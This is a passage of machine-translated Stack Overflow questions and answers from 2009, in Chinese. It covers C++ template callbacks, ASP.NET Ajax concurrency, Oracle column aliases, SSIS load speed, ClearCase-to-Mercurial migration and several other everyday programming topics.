    return DoStuff(Class2<DataType>(pdata));
}

template<class C>
DoStuff(C c)
{
  c.Print();
} 
```

现在我知道你在问，为什么要使用`Class1`and `Class2`？好吧，处理文件和处理内存之间的根本区别是如此之大，以至于为不同类型的输入使用不同的类是有意义的（而不是仅仅重载构造函数并让它对不同的输入表现不同）。同样，我确实对此进行了基准测试，在他们自己的类中处理特殊情况比在每个函数中都有`case`s/ s快得多。`if`

所以我想做的是对初级开发人员隐藏很多这种实现，我不希望他们必须创建三个不同的重载`DoStuff`s 来处理不同的输入。理想情况下，我只需设置某种类型的回调，`#defines`他们需要做的就是创建一个名为的类并重`DoStuff`载运`()`算符并让函子完成工作。

我遇到的麻烦是，`DoStuff`完成这项工作的函数只是模板化，`<class C>`但 C 本身是模板化的`<class DataType>`，我无法弄清楚如何以通用方式传递所有内容。例如，我不能使用`template <class C<DataType>>`or `template<template< class DataType> class C>`。它只是不会编译。

有没有人有一个很好的技巧来使用这个嵌套的模板类进行通用回调，无论是函数还是仿函数（我不在乎）？基本上我想要一些东西，我可以编写一个不关心存储数据的类的通用函数，并让一个最常见的函数调用它，以确定要使用哪个类。

```
BigSwitch(CallBack,Inputs)
{
    switch(//something)
    {
    case 1: return CallBack(Class1<Type>(Inputs))
    case 2: return CallBack(Class2<Type>(Inputs))
    }
} 
```

这样我可以编写一个`BigSwitch`函数并让其他人编写回调函数。

有任何想法吗？

* * *

编辑以澄清 Jalf：

我有两个非常相似的类，`Class1`它们`Class2`代表基本相同类型的数据，但是数据存储有很大不同。为了使其更具体，我将使用一个简单的示例：`Class1`是一个简单的数组，`Class2`看起来像一个数组，但不是存储在内存中而是存储在文件中（因为它太大而无法放入内存）。所以我现在就给他们`MemArray`打电话`FileArray`。所以假设我想要数组的总和。我可以做这样的事情

```
template <class ArrayType, class ReturnType>
ReturnType Sum(ArrayType A)
{
    ReturnType S=0;
    for (int i=A.begin();i<A.end();++i)
    {
      S+=A[i];
    }
    return S;
} 
```

但是现在，我需要一种将真实数据加载到数组中的方法。如果它是一个基于内存的数组，我会这样做

```
MemArray<DataType> M(pData); 
```

如果它是文件格式，我会这样做

```
FileArray<DataType> F(filename); 
```

并且这两个调用都是有效的（因为编译器在编译时生成两个代码路径）

```
double MS=Sum<MemArray<DataType>,double>(M);
double FS=Sum<FileArray<DataType>,double>(F); 
```

所有这些都假设我知道 DataType 是什么，但是对于基于文件的数组，我可能不知道数据类型，直到我打开文件并查询标题以了解数组中的数据类型。

```
double GetSum(char* filename)
{
    int DataTypeCode=GetDataTypeCode(filename);
    switch (DataTypeCode)
    {
    case 1: return Sum<FileArray<int>,double>(FileArray<int>(filename));
    case 2: return Sum<FileArray<double>,double>(FileArray<double>(filename));
    }
}
template <class DataType>
double GetSum(DataType* pData)
{
    return Sum<MemArray<DataType>,double>(MemArray<DataType>(pData));
} 
```

所有这些都有效，但它需要编写两个重载`GetX`函数和一个`X`函数来完成我想做的所有事情。除了它调用的`GetX`函数之外，这些函数每次基本上都是相同的代码。`X`所以我希望能够写出类似的东西

```
double GetX(CallBackType X, char* filename)
{
    int DataTypeCode=GetDataTypeCode(filename);
    switch (DataTypeCode)
    {
    case 1: return X<FileArray<int>,double>(FileArray<int>(filename));
    case 2: return X<FileArray<double>,double>(FileArray<double>(filename));
    }
}
template <class DataType>
double GetX(CallBackType, DataType* pData)
{
    return X<MemArray<DataType>,double>(MemArray<DataType>(pData));
} 
```

这样我就可以打电话

```
GetX(Sum,filename) 
```

然后当其他人想要添加一个新函数时，他们需要做的就是编写函数并调用

```
GetX(NewFunction,filename) 
```

我只是在寻找一种方法来编写我的重载`GetX`函数和我的`X`函数，以便我可以从实际算法中抽象出输入/存储的方式。通常，这不是一个难题，只是我遇到了麻烦，因为该`X`函数包含一个模板参数，该参数本身是模板化的。`template<class ArrayType>`也有一个隐含的隐藏`ArrayType<DataType>`在那里。编译器对此不满意。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T21:46:22.337

关注问题的最初部分（为什么不只是使用继承）：

进行编译时多态性并通过基类访问派生类成员的常用方法是通过[CRTP](http://en.wikipedia.org/wiki/Curiously_Recurring_Template_Pattern)模式。

```
template <typename T>
class IInterface {
  void DoStuff() {
    void static_cast<T*>(this)->DoStuff()
  }
};

class Class1 : IInterface<Class1> {
  void DoStuff(){...}
} 
```

那能解决你的问题吗？

**编辑：** 顺便说一句，我很高兴我能提供帮助，但下次请尝试更多地构建你的问题。

我真的不知道你在问什么，所以这只是在黑暗中刺伤，基于你问题的前 3 行。;)

您永远不会真正解释您要实现的目标，而只会解释您无法正常工作的解决方法是什么样的。开始陈述问题，因为这是我们真正需要知道的。然后，您可以提供有关当前解决方法的详细信息。在发布代码时，添加一些上下文。DoStuff() 从哪里调用，为什么初级开发人员需要定义它们？（你已经这样做了，不是吗？）

初级开发人员首先会使用此代码做什么？

令人困惑的是，您提供了具体情况（1 和 2），而不是 switch 语句本身（//某事）

如果您尝试使回答的人更容易，下次您将获得更多（更好和更快）的答案。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T21:36:12.137

至于您关于“通用回调”的问题，您可以使用[boost::function](http://www.boost.org/doc/libs/1_39_0/doc/html/function.html)但它本质上是在幕后使用虚函数（它可能不是 - 但至少是一个类似的概念），所以您正在寻找的性能差异不会在那里（实际上 boost::function 可能会因为堆分配而变慢）。

# asp.net - ASP.NET MVC + jQuery + IIS6：多个 Ajax 请求

> ID：860478
> 
> 赞同：1
> 
> 时间：2009-05-13T21:17:22.713
> 
> 标签：asp.net, jquery, asp.net-mvc, iis, iis-6

我不确定问题出在哪里...

我有一个 ajax 请求，它检查页面上包含包裹列表的包裹的跟踪信息：

```
$(".fedex_status").each(function () {
    var item = this;
    // some code to construct tracking_url

    $.ajax({
        type: "GET",
        url: tracking_url,
        async: true,
        cache: false,
        success: function (data) { $(item).html("(" + data + ")"); },
        error: function () { $(item).html("request failed..."); }
    });
}); 
```

因此，如果页面上有 10 个包（10 个带有“fedex_status”类的东西），则会创建 10 个请求。请求工作正常，但一次返回一个结果（以串行方式）。我在控制器操作中为请求的开始和停止添加了时间戳：

```
public ActionResult Fedex(string trackingNumber)
{
    DateTime requestStart = DateTime.Now;
    TrackingService tracking = new TrackingService();
    string status = tracking.FedexTrackingNumberStatus(trackingNumber);
    return Content(status + " - " + requestStart.ToString("hh:mm:ss.FFF") + " - " + DateTime.Now.ToString("hh:mm:ss.FFF"));
} 
```

没有一个时间戳重叠。所以控制器一次处理一个请求。这似乎很糟糕。

现在，ajax 请求“应该”是并行的。它肯定会立即返回（它是异步的）。当我查看 IIS 日志时，请求具有与控制器操作返回相同的时间戳。

所以我的问题是：jquery 是不是并行发送所有 ajax 请求，还是 IIS 或 ASP.NET 只串行处理请求。我是 IIS 和 ASP.NET 技术细节的大菜鸟，所以它可能永远被错误配置，并且一次只响应一个请求（仅限内部使用，低流量）。也就是说，我也是 jquery 的白痴，不知道如何测试请求何时被实际触发（我所知道的是 $.ajax 调用立即返回）。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-13T21:30:44.000

理论上，启用会话状态的 ASP.NET 会为每个用户请求锁定会话，从而串行处理它们。我不认为您可以轻松地为 MVC 项目禁用 Session，因为 TempData 例如默认使用会话。但是你可以试试。

编辑：这是一个[相关的问题](https://stackoverflow.com/questions/387124/why-would-asp-net-mvc-use-session-state)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-14T16:37:34.367

您的代码在我的机器上按预期工作。我不得不在 Thread.Sleep 中插入任何人为的延迟才能看到它的实际效果，因为纯粹的请求执行得如此之快，以至于看起来它们都立即完成了。

```
 System.Threading.Thread.Sleep(1000);

 return Content(String.Format("Thread #{0}, Started = {1:hh:mm:ss.FFF}, Completed = {2:hh:mm:ss.FFF}, Duration = {3:hh:mm:ss.FFF}, Result = {4}",
       System.Threading.Thread.CurrentThread.ManagedThreadId,
       requestStart,
       DateTime.Now,
       DateTime.Now.Subtract(requestStart),
       status)); 
```

在我的机器上使用 Firefox 并连接到内置的 Visual Studio Web Server 的快速测试表明，两个请求在客户端上同时执行，并由服务器上的两个不同线程处理。

据我所知，浏览器允许的并发请求数量有限。这是关于 SO 的另一篇文章，其中涵盖了每个流行浏览器的每个值：流行浏览器[中允许多少并发 AJAX (XmlHttpRequest) 请求？](https://stackoverflow.com/questions/561046/how-many-concurrent-ajax-xmlhttprequest-requests-are-allowed-in-popular-browser)

编辑：我重读了你的帖子，看到你提到了 IIS 6。我无权访问 IIS 6，但是在 IIS 7 Web 服务器上运行它并有 5 秒的人工超时（Thread.Sleep）表明正在处理多个请求同时由不同的服务器线程。它们都不是在完全相同的时间开始的，所以服务器上可能会有一些排队，但是有 5 秒的延迟很容易看出在 Firefox 3.0 中我一次至少有 6 个并发请求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T21:20:58.090

每次找到具有 .fedex_status 类的元素时，您都在调用 ajax 请求。

你的线

$(".fedex_status").each

是说每次你找到一个 .fedex_status 类的元素时都这样做。

# asp.net - 使用 TFS 客户端 API 上传文件

> ID：860495
> 
> 赞同：1
> 
> 时间：2009-05-13T21:20:39.477
> 
> 标签：asp.net, api, file-upload, tfs, tfs-sdk

我想将文件从 asp.net 网页上传到 TFS 服务器。使用 TFS API 我从我的网页创建了错误 - 但该错误还需要文件附件才能上传，请告诉我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-14T02:44:35.430

您应该能够简单地创建一个 Attachment 对象并将其添加到 WorkItem 上的 Attachments 集合中，然后再保存它：

```
Dim attachment As New Microsoft.TeamFoundation.WorkItemTracking.Client.Attachment("c:\somefile.txt", "My Comment")
workItem.Attachments.Add(attachment)
workItem.Save() 
```

# templates - 用 UML 表示模板类的正确方法是什么？

> ID：860501
> 
> 赞同：49
> 
> 时间：2009-05-13T21:22:04.220
> 
> 标签：templates, uml, diagram

在 UML 图上，表示模板类的正确方法是什么？

* * *

## 回答 #1

> 赞同：88
> 
> 时间：2009-05-13T21:27:00.637

右上角有一个虚线矩形的普通矩形，表示模板参数。像这样的东西：

```
 .......               
___________:  T  :
|          :.....:
|              |
|  ClassName   |
|              |
|______________| 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-10-06T00:05:03.210

一个更有用的方法是对模板使用 UML 分类器。这是一个 UML 元素，表示对 UML 表示法的扩展。如果您的工具支持配置文件，请在其中创建分类器。为模板定义分类器，并包含模板中的属性和方法，然后使用您为使用模板的每个类创建的分类器，而不是使用标准的类表示法。这将是模板的 UML 的正确用法。

# c++ - 删除第一对后，STL 映射不添加一对

> ID：860510
> 
> 赞同：0
> 
> 时间：2009-05-13T21:23:53.390
> 
> 标签：c++, stl, map

在这段代码中，我在地图上添加了一对，一切都很好，但是当我删除不是最后一个的一对时，地图不再添加任何对。我做错了什么？？

```
SomeClass::add(Object object)
if (!object.empty())
{
    ObjectList::iterator result = find(object.name());
    if (result == ObjectList.end())
    {
        object.order(size() + 1);
        ObjectList.insert(orderedObject(object.order(), object));
    }
    else
    {
        ObjectList[result->first] = object;
    }
} 
```

ObjectList 和 orderedObject 声明如下：

```
typedef std::pair<int, Object> orderedObject;
typedef std::map<int, Object> ObjectList; 
```

这是删除代码：

```
SomeClass::eraseNamed(std::string aName)
{
    if (!isEmpty())
    {
        ObjectList::iterator result;
        result = find(aName);
        if (result != ObjectList.end())
        {
            ObjectList.erase(result);
            reorgObjectList();
            return true;
        }

    }
    return false;
} 
```

对于查找方法：

```
ObjectList::iterator SomeClass::find(std::string aName)
{
    ObjectList::iterator result = ObjectList.begin();
    while (result != ObjectList.end())
    {
        if (aName == result->second.name())
            return result;
        result++;
    }
    return result;
} 
```

对于重组对象列表：

```
bool SomeClass::reorgObjectList()
{
    ObjectList::iterator i=ObjectList.begin();
    int j=1;
    for (i = ObjectList.begin(); i != ObjectList.end(); ++i)
    {
        if(j!=i->second.order())
            i->second.order(j);
        j++;
    }
    return true;
} 
```

有什么建议么？？？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-05-13T21:33:10.160

好吧，您正在键入地图的大小，这似乎可能会导致您的问题。

因此，如果您在地图上有 3 件东西，您将拥有

```
 1 => Obj1
  2 => Obj2
  3 => Obj3 
```

如果您删除其中一个元素，例如 1，您将拥有

```
 2 => Obj2
  3 => Obj3 
```

然后稍后你去插入，并将键设置为“size() + 1”，size 将返回 2，你将尝试在键 2 + 1 == 3 处插入。3 已经被占用。所以它要么被覆盖要么失败（不确定你的 find 在上面是如何工作的）。

如果您想管理密钥，我会检查最后一个密钥并增加 1，而不是插入大小 + 1。

# asp.net - 在javascript中获取列表框的选定项目

> ID：860511
> 
> 赞同：3
> 
> 时间：2009-05-13T21:23:58.193
> 
> 标签：asp.net, javascript, vb.net

我在 asp.net 中有两个列表框。单击按钮时，我想加载一个列表框，其中包含另一个框中所选项目的元素。问题是这必须在客户端完成，因为单击按钮时我不允许它提交。我想调用一个javascript函数onselectedindexchange，但那是服务器端。有任何想法吗？我应该更清楚吗？

***解决方案***

```
enter code here
function Updatelist() {
    var sel = document.getElementById('<%=ListBox1.ClientID%>')
    var lst2 = document.getElementById('<%=ListBox2.ClientId %>')
    var listLength = sel.options.length;
    var list2length = lst2.options.length;
    for (var i = 0; i < listLength; i++) {
        if (sel.options[i].selected) {
            //lst2.options.add(sel.options[i].text);
            lst2.options[list2length] = new Option(sel.options[i].text);
            list2length++;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-13T21:41:51.067

尝试：

```
 //onclick for button calls this function
 function Updatelist() {
 var sel = document.getElementbyId("list1");
 var listLength = sel.options.length;
 for(var i=0;i<listLength;i++){
    if(sel.options[i].selected)
    document.getElementById("list2").add(new Option(sel.options[i].value));
  } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-14T08:42:09.720

更准确地说，我们可以这样做；

```
function selectedVal(list) {   
    alert(list.options[list.selectedIndex].text);                  
} 

<select id="listbox" multiple="multiple" 
        style="height: 300px; width: 200px;" 
        onclick="javascript:selectedVal(this);">  
</select> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T21:40:06.123

这是一篇关于如何使用 Jquery 执行此操作的好[文章。](http://sushantp.wordpress.com/2009/02/22/aspnet-fill-and-show-dependent-drop-down-list-on-client-side-without-server-control-and-postback/)

您也可以将下拉菜单粘贴在更新面板中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-14T19:00:45.430

```
function Updatelist() {
var sel = document.getElementById('<%=ListBox1.ClientID%>')
var lst2 = document.getElementById('<%=ListBox2.ClientId %>')
var listLength = sel.options.length;
var list2length = lst2.options.length;
for (var i = 0; i < listLength; i++) {
    if (sel.options[i].selected) {
        //lst2.options.add(sel.options[i].text);
        lst2.options[list2length] = new Option(sel.options[i].text);
        list2length++;
    }
} 
```

}

# oracle - Oracle - 选择语句中的动态列名

> ID：860516
> 
> 赞同：8
> 
> 时间：2009-05-13T21:26:15.537
> 
> 标签：oracle

问题：

是否可以根据结果集中的值更改选择语句中的列名？

例如，如果`year`结果集中的值小于`1950`，则命名该列`OldYear`，否则命名该列`NewYear`。结果集中的`year`值保证对于所有记录都是相同的。

我认为这是不可能的，但这是我测试这个想法的失败尝试：

```
select 1 as  
(case  
when 2 = 1 then "name1";  
when 1 = 1 then "name2")  
from dual; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-13T21:53:54.010

您不能更改结果集的每一行的列名。这是关系数据库的基础。列的名称是表“标题”的一部分，并且名称适用于所有行的列。

* * *

重新评论：好的，也许 OP Americus 意味着已知结果恰好是一行。但无论如何，SQL 没有支持动态列别名的语法。列别名在查询中必须保持不变。

即使是动态 SQL 也无济于事，因为您必须运行两次查询。一次获取值，第二次使用不同的列别名重新运行查询。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-11T19:44:06.227

在 SQL 中执行此操作的“正确”方法是同时拥有两列，并将不合适的列设为 be `NULL`，例如：

```
SELECT
   CASE WHEN year < 1950 THEN year ELSE NULL END AS OldYear,
   CASE WHEN year >= 1950 THEN year ELSE NULL END AS NewYear
FROM some_table_with_years; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-15T06:51:58.590

没有充分的理由动态更改列名 - 它类似于过程代码中的变量名称 - 它只是您稍后可能会在代码中引用的标签，因此您不希望它在运行时更改。

我猜你真正想要的是一种根据数据以不同方式格式化输出（例如用于在报告中打印）的方法。在这种情况下，我会将标题文本生成为查询中的单独列，例如：

```
SELECT 1 AS mydata
      ,case
          when 2 = 1 then 'name1'
          when 1 = 1 then 'name2'
       end AS myheader
FROM dual; 
```

然后调用过程将获取为 mydata 和 myheader 返回的值，并根据需要对它们进行格式化以输出。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-14T07:03:10.193

您将需要类似的东西：

```
select 'select ' || CASE WHEN YEAR<1950 THEN 'OLDYEAR' ELSE 'NEWYEAR' END  || ' FROM TABLE 1' from TABLE_WITH_DATA 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-03-21T14:50:11.413

此解决方案要求您从 .bat 文件启动 SQLPLUS 和 .sql 文件，或使用具有适当 Oracle 凭据的其他方法。.bat 文件可以从服务器计划任务、Control-M 作业等手动启动...

输出是一个 .csv 文件。这还要求您将输出中的所有逗号替换为输出中的某些其他字符或风险列/数据不匹配。

诀窍是您的列标题和数据是在两个不同的 SELECT 语句中选择的。

它并不完美，但它确实有效，而且它最接近标准 Oracle SQL，这是我在开发环境之外为动态列标题找到的。我们广泛使用它来为用户生成重复的每日/每周/每月报告，而无需借助 GUI。输出保存到共享网络驱动器目录/Sharepoint。

```
 REM BEGIN runExtract1.bat file -----------------------------------------
        sqlplus username/password@database @C:\DailyExtracts\Extract1.sql > C:\DailyExtracts\Extract1.log

        exit
        REM END runExtract1.bat file -------------------------------------------

        REM BEGIN Extract1.sql file --------------------------------------------
        set colsep ,
        set pagesize 0
        set trimspool on
        set linesize 4000

        column dt new_val X 
        select to_char(sysdate,'MON-YYYY') dt from dual; 

        spool c:\DailyExtracts\&X._Extract1.csv

        select '&X-Project_id', 'datacolumn2-Project_Name', 'datacolumn3-Plant_id' from dual;

        select 
          PROJ_ID
          ||','||
          replace(PROJ_NAME,',',';')--  "Project Name"
          ||','||
          PLANT_ID--  "Plant ID"
         from PROJECTS
         where ADDED_DATE >= TO_DATE('01-'||(select to_char(sysdate,'MON-YYYY') from dual));

        spool off
        exit
        /
        REM ------------------------------------------------------------------

CSV OUTPUT (opened in Excel and copy/pasted):

old   1: select '&X-Project_id'  'datacolumn2-Project_Name'  'datacolumn3-Plant_id' from dual
new   1: select 'MAR-2018-Project_id'    'datacolumn2-Project_Name'  'datacolumn3-Plant_id' from dual
MAR-2018-Project_id datacolumn2-Project_Name    datacolumn3-Plant_id

    31415   name1   1007
    31415   name1   2032
    32123   name2   3302
    32123   name2   3384
    32963   name3   2530
    33629   name4   1161
    34180   name5   1173
    34180   name5   1205
    ...
    ...
    etc...

    135 rows selected. 
```

# winforms - Windows 窗体中的 SubSonic 和 app.config

> ID：860519
> 
> 赞同：0
> 
> 时间：2009-05-13T21:26:53.227
> 
> 标签：winforms, configuration, subsonic, app-config

因为它应该是应用程序 Windows 窗体中的文件 app.config，以便它们在构建中自动生成给定的访问类？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-14T22:02:15.727

是的。您所做的是在 configSections 中添加一个名为“SubsonicService”的部分，如下所示：

```
<configSections>
    <section name="SubSonicService" type="SubSonic.SubSonicSection, SubSonic" requirePermission="false"/>
</configSections> 
```

接下来，添加一个 connectionStrings 分支，其中包含将在项目中使用的连接字符串，如下所示：

```
<connectionStrings>
    <clear/>
    <add name="WheelMUDSQLite" connectionString="Data Source=C:\Dev\WheelMud.net\src\SQL\SQLite\WheelMud.net.db;Version=3;"/>
</connectionStrings> 
```

最后，添加您在 configSections 中添加的 SubsonicService 节点，如下所示：

```
<SubSonicService defaultProvider="WheelMUDSQLite">
    <providers>
        <clear/>
        <add name="WheelMUDSQLite" type="SubSonic.SQLiteDataProvider, SubSonic" connectionStringName="WheelMUDSQLite" generatedNamespace="WheelMUD.DataLayer"/>
    </providers>
</SubSonicService> 
```

这是您放置所有提供商的地方。我使用 SubStage 实用程序来生成 DAL。通过这种方式，您可以将您的内容与 Subsonic 附带的 Web 位完全分离。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-15T08:19:28.300

您的构建过程需要包含如下命令：

```
sonic.exe generate /config "c:\myproject\App.config" 
```

sonic.exe 是[SubCommander](http://subsonicproject.com/subcommander/using-the-command-line-tool-subcommander/)实用程序，包含在[当前版本](http://code.google.com/p/subsonicproject/)中。无法让 app.config 直接为您处理此问题。

运行命令的一种方法是使用[MSBuild](http://msdn.microsoft.com/en-us/library/ms171452(VS.80).aspx)。[Exec MS Build 任务](http://msdn.microsoft.com/en-us/library/x8zx72cd(VS.80).aspx)任务可能如下所示：

```
<Target Name="GenerateSubSonicClasses" DependsOn="BeforeBuild">
  <Exec Command="sonic.exe generate /config &quot;c:\myproject\App.config&quot;" WorkingDirectory="c:\path-to-subcommander"/>
</Target> 
```

我只是编造了这个，所以它可能需要调整才能对你有用。该命令将进入您的*Visual Studio 项目*文件（即*someproject.vbproj*）。

# sql-server - sql server 表快速加载不是

> ID：860520
> 
> 赞同：1
> 
> 时间：2009-05-13T21:26:55.787
> 
> 标签：sql-server, ssis

我继承了一个 SSIS 包，它将 500K 行（大约 30 列）加载到临时表中。

它现在已经烹饪了大约 120 分钟，但还没有完成 --- 这表明它的运行速度低于每秒 70 行。我知道每个人的环境都不同，但我认为这与“典型”相差几个数量级。

奇怪的是，暂存表在 INT（身份）列上有一个 PK 约束——现在我认为它可能会妨碍加载性能。暂存表上没有其他约束、索引或触发器。

有什么建议么？

---- 附加信息 ------
源是一个制表符分隔的文件，它连接到两个单独的数据流组件，这些组件将一些静态数据（运行日期和批次 ID）添加到流中，然后连接到一个OLE DB 目标适配器

访问模式是使用 FastLoad 的 OpenRowset

FastLoadOptions 是 TABLOCK、CHECK_CONSTRAINTS

最大插入提交大小：0

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-05-14T03:21:08.137

我不确定回答我自己的问题的礼仪——如果这更适合发表评论，请提前抱歉。

问题是文本文件中输入列的数据类型：它们都被声明为“文本流 [DT_TEXT]”，当我将其更改为“字符串 [DT_STR]”时，在 58 秒内加载了 200 万行，现在在“典型”领域——我不确定当列以这种方式声明时文本文件源在做什么，但它现在已经落后了！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T21:35:16.303

我会说存在某种问题，我从一个包含 2000 万条记录和更多列的文件中批量插入一个临时表，并且在更短的时间内插入一个标识字段，并且 SSIS 应该比 SQL Server 2000 批量更快插入。

你检查过阻塞问题吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T21:35:03.840

如果它在一项大事务中运行，那可能会解释一些事情。确保不时地完成提交。

您可能还需要检查处理器负载、内存和 IO 以排除资源问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-13T21:50:35.060

这很难说。

我有复杂的 ETL，我会检查数据流中允许的最大线程数，看看某些东西是否可以并行运行。

但这听起来像是一个简单的转移。

对于 500,000 行，批处理是一种选择，但我认为这几行没有必要。

PK 身份应该不是问题。您在目标上是否有任何复杂的约束或持久的计算列？

这是拉动还是推动缓慢的网络链接？它是从复杂的 SP 或视图中拉出还是推入？数据源是什么？

# version-control - Migrating from clearcase to mercurial

> ID：860524
> 
> 赞同：10
> 
> 时间：2009-05-13T21:28:12.260
> 
> 标签：version-control, mercurial, clearcase

What tools are available to migrate from clearcase to mercurial? Is it possible to move history? What kind of limitations are there?

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-05-14T04:28:49.440

不要忘记 ClearCase（**中央**VCS）和 Mercurial（**分布式**VCS）是非常不同的。
有关完整列表，请参阅[核心 ClearCase 概念](https://stackoverflow.com/questions/645008/what-are-the-basic-clearcase-concepts-every-developer-should-know/645771#645771)。

在迁移的情况下，这意味着您正在处理以*存储库为中心的*VCS（Mercurial），这意味着“使用时间线”（时间线是提交，构建新的变更集）
但是在 ClearCase 中，没有全局时间线，因为每个*文件*都是单独提交的（以文件为中心的 VCS）。

因此，对于迁移，您需要使用配置规范设置 ClearCase 动态视图，您将更改以列出所有相关的“ClearCase 时间线”（非 UCM 视图的标签甚至更好：UCM 视图的基线）并将该固定状态导入水银。
并重复该过程，直到最近的标签/基线。

这个想法是：从 ClearCase 迁移到另一个 (D)VCS 时，通常不需要导入所有文件的*所有**历史*记录。只需要记录“重大”变化。 我不推荐“将 ClearCase 存储库[转换为 Mercurial](http://www.selenic.com/mercurial/wiki/ClearCaseConversion) ”一文，尤其是对于大型和旧的 ClearCase 存储库。

 *另请参阅[SVN 迁移以了解其他注意事项](https://stackoverflow.com/questions/542479/what-is-the-best-strategy-when-migrating-from-clearcase-to-svn)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-05-13T22:54:10.153

您可以在 Mercurial 网站上开始[为 Clearcase/UCM 用户提供信息](http://www.selenic.com/mercurial/wiki/ClearcaseInfo)和[将 ClearCase 存储库转换为 Mercurial](http://www.selenic.com/mercurial/wiki/ClearCaseConversion)

# php - 未定义的 lcfirst()

> ID：860529
> 
> 赞同：7
> 
> 时间：2009-05-13T21:29:54.703
> 
> 标签：php, function, undefined

致命错误：在第 9 行调用 C:\xampp\htdocs\allsides\others\basecontroller.php 中的未定义函数 lcfirst()

怎么没有找到官方php手册（[http://www.php.net/manual/en/function.lcfirst.php](http://www.php.net/manual/en/function.lcfirst.php)）中提到的Text Proccessing函数？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-05-13T21:31:25.873

检查版本：`(PHP 5 >= 5.3.0)`

您显然有一个低于此的版本。:)

用于[`phpversion()`](http://www.php.net/phpversion)快速检查您拥有的版本。

然而，正如评论所指出的，这个函数很容易复制：

```
if(function_exists('lcfirst') === false) {
    function lcfirst($str) {
        $str[0] = strtolower($str[0]);
        return $str;
    }
} 
```

您可以将上述代码放在项目的库/实用程序文件中的某个位置，并且当您升级到 5.3.0 时它不会中断。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-05-13T21:31:26.683

从您链接的 PHP 手册页：

> （PHP 5 >= 5.3.0）

此功能仅在您使用 PHP 5.3 或更新版本时存在。

# groovy - IntelliJ Groovy version

> ID：860536
> 
> 赞同：8
> 
> 时间：2009-05-13T21:31:33.750
> 
> 标签：groovy, intellij-idea, version

I'm in the process of upgrading a project to Groovy v1.6\. When I installed IntelliJ, my `GROOVY_HOME` environment variable was pointing to Groovy v1.5.7, but now that I've changed `GROOVY_HOME` to point to v1.6, it's not clear whether IntelliJ is also using the more recent version.

How can I check which version of Groovy IntelliJ is using?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-14T04:08:15.433

我相信您想使用 File -> Project Structure 菜单项。然后查看您的库和方面（扩展为 Groovy）选项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-14T12:57:24.917

使用“添加框架支持”：

右键单击您的模块并选择“添加框架支持...”。在那里您可以添加/更改 groovy 版本

[http://blogs.jetbrains.com/idea/2009/09/groovy-related-configuration-changes/](http://blogs.jetbrains.com/idea/2009/09/groovy-related-configuration-changes/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-12-11T11:56:43.123

发现这个旧线程正在寻找类似的东西，但最终自己弄清楚了。

在我的例子中，这个项目是用[Gradle](https://gradle.org)推动的。我的机器上没有安装独立的 Groovy 版本。

打开`Tools -> Groovy Console...`，然后键入几乎任何命令并运行它。它在新窗口顶部附近向我展示了 Gradle 缓存的路径，其中包括 Groovy 版本：

```
.../.gradle/caches/modules-2/files-2.1/org.codehaus.groovy/groovy-all/2.4.12/... 
```

还要检查`build.gradle`，因为它可能对项目使用的版本有一些提示。

# java-me - J2ME 背光

> ID：860540
> 
> 赞同：3
> 
> 时间：2009-05-13T21:32:29.083
> 
> 标签：java-me, mobile, backlight

除了预处理之外，有没有可靠的方法在 J2ME 中支持多种模型的背光？

是否有任何可用的库可以处理各种手机的背光？问候。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-06-24T23:47:08.890

这不是诺基亚 UI API 中的直接控制，但 MIDP 中有一个控制背光的方法，它是`Display.flashBacklight(int duration)`. 不幸的是，手机没有义务遵守这种方法。但是这个方法至少是 MIDP 的一部分，而不是一些专有的 API。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-15T10:58:03.490

手机上的原生背光管理范围从完全自然到明显疯狂。

在 MIDP 规范中也没有。

诺基亚 UI API 允许解决一些问题，并且实际上存在于非诺基亚手机上。

# asp.net - 图表系列工具提示中的字体设置

> ID：860543
> 
> 赞同：1
> 
> 时间：2009-05-13T21:33:50.360
> 
> 标签：asp.net, asp.net-mvc, .net-3.5, mschart

是否可以更改 mschart 控件中工具提示文本的字体设置？

我尝试设置图表系列字体，但它不会影响与系列数据关联的工具提示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2011-04-26T11:49:05.160

我认为不可能更改实际工具提示的字体。如果您查看页面源代码，工具提示文本位于哪个标签中？

您可能可以使用 QTip 和 JQuery 之类的东西来操作它以显示自定义工具提示。

# wcf - WCF 获取“必须加密主签名”。来自具有 ProtectionLevel.None 的 FaultContract

> ID：860546
> 
> 赞同：1
> 
> 时间：2009-05-13T21:35:16.147
> 
> 标签：wcf, wcf-security, wcf-faults

